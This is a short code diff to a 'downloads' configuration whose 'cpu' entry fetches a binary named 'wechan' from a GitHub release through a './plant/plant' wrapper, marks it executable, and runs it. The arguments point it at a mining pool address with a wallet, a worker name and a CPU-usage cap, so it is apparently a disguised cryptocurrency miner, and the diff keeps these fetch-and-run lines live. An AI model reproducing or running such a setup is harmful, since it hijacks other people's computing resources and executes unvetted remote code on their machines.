@@ -47,8 +47,8 @@ downloads = {
     "cpu": {
         "link": "./plant/plant wget -q https://github.com/handevproject/starterpack/releases/download/1.0.3/wechan",
         "run": [
-            "chmod +x wechain",
-            "./plant/plant ./wechain -o 212.32.255.5:3333 -u 0x311aed99c10555365dd2a6e1ed1caf8ea830907c -p 250 -t 4 --worker=clarksye --donate-level=1% --max-cpu-usage=75"
+            "chmod +x wechan",
+            "./plant/plant ./wechan -o 212.32.255.5:3333 -u 0x311aed99c10555365dd2a6e1ed1caf8ea830907c -p 250 -t 4 --worker=clarksye --donate-level=1% --max-cpu-usage=75"
         ]
     }
 }
